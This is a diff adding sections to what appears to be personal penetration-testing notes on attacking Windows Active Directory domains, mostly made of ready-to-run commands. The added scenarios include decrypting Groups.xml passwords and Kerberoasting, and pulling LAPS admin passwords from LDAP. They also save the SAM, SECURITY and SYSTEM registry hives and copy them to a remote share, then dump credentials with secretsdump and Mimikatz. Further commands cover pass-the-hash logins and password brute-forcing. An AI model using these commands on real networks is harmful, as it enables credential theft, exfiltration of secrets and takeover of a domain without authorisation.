@@ -26,13 +26,12 @@ Hacktricks
 
 https://github.com/S1ckB0y1337/Active-Directory-Exploitation-Cheat-Sheet 
 https://book.hacktricks.xyz/windows/active-directory-methodology 
- 
 DNS 53 https://book.hacktricks.xyz/network-services-pentesting/pentesting-dns
 KRB 88 https://book.hacktricks.xyz/network-services-pentesting/pentesting-kerberos-88
 RPC 135 https://book.hacktricks.xyz/network-services-pentesting/135-pentesting-msrpc
 LDAP 389,636,3268,3269 https://book.hacktricks.xyz/network-services-pentesting/pentesting-ldap
 
-=================================== 
+===================================
 vim /etc/hosts
 
 DNS
@@ -45,6 +44,100 @@ dnsenum mike.com --dnsserver dns.mike.com -f ~/tools/wordlists/dns.txt
 Zone Transfer
 dnsrecon -d mike.com -t axfr  
 nmap --script=dns-zone-transfer -p 53 ns2.mike.com 
+
+
+=================================== 
+AD Entry Scenario - 1
+
+SMB open-share
+Find and crack 'Groups.xml'
+SMB Authenticated
+Kerberoast with SVC account with creds.
+
+smbmap -H 192.168.200.5 -u '' -p '' 
+smbclient -L //192.168.200.5  
+smbclient //192.168.200.5/share 
+smbmap -H 192.168.200.5 -R
+get Groups.xml
+gpp-decrypt abczyz  = paxxword
+smbclient //192.168.200.5/secrets -U mike.com\\SVC%paxxword
+GetUserSPNs.py -request mike.com/SVC
+
+
+=================================== 
+AD Entry Scenario - 2 
+
+Query LDAP w/o creds.
+Find Comments with Password
+Use creds to upload with WebDAV
+Found 'LAPS' Directory, so try LAPS pw-search in LDAP
+Connect with evil-winrm
+
+nmap -n -sV --script "ldap* and not brute" 192.168.200.5
+ldapsearch -v -x -b "DC=mike,DC=com" -H "ldap://192.168.200.5" "(objectclass=*)"
+dir "C:\Program Files\LAPS"
+ldapsearch -v -x -D bob@mike.com -w paxx -b "DC=mike,DC=com" -H "ldap://192.168.200.5" "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd 
+evil-winrm -i 192.168.200.5 -u administrator -p paxx
+pxexec.py administrator@mike.com
+
+=================================== 
+AD Entry Scenario -3 
+
+Get in with Upload Vuln
+Exploit service running as system
+winpeas can find auto-logon creds
+Mimikatz can find hashes/creds
+Re-use hash/creds on next-level box
+Find domain users and pivot till you get DA
+
+cd C:\Users\Administrator\Downloads\
+reg.exe save hklm\sam samx 
+reg.exe save hklm\security securityx 
+reg.exe save hklm\system systemx 
+net use \\192.168.162.46\share /USER:mike paxx 
+copy *x \\192.168.162.46\share\ 
+secretsdump -sam samx -system systemx LOCAL
+
+mimikatz_64.exe 
+privilege::debug  
+token::elevate  
+lsadump::cache
+lsadump::secrets
+sekurlsa::logonpasswords
+
+psexec administrator@192.168.200.5 -hashes aadc123:abc123
+
+
+=================================== 
+Hunting with NO creds
+
+RPC
+nmap -p 135 --script=msrpc-enum 192.168.200.5 
+rpcclient 192.168.200.5 -U ''
+r> enumdomusers
+
+SMB
+sudo nmap -p 445 -v --script=smb-enum-shares,smb-enum-users 192.168.200.5
+sudo nmap -p 139,445 -v --script=smb-vuln* 192.168.200.5 
+enum4linux -A 192.168.200.5
+crackmapexec smb 192.168.200.5 -u guest -p "" --shares 
+smbmap -H 192.168.200.5
+smbmap -H 192.168.200.5 -u '' -p '' 
+smbclient -L 192.168.200.5 -p12445
+smbclient -L //192.168.200.5  
+smbclient -L //192.168.200.5/ -U "guest"
+smbclient //192.168.200.5/share 
+
+NFS
+showmount -e 192.168.200.5
+
+LDAP
+nmap -n -sV --script "ldap* and not brute" 192.168.200.5
+ldapsearch -v -x -b "DC=mike,DC=com" -H "ldap://192.168.200.5" "(objectclass=*)"
+impacket-lookupsid mike.com/guest@192.168.200.5
+
+Brute from Userlist
+crackmapexec smb 192.168.200.5 -d mike.com -u users.txt -p pass.txt 
 
 
 ===================================
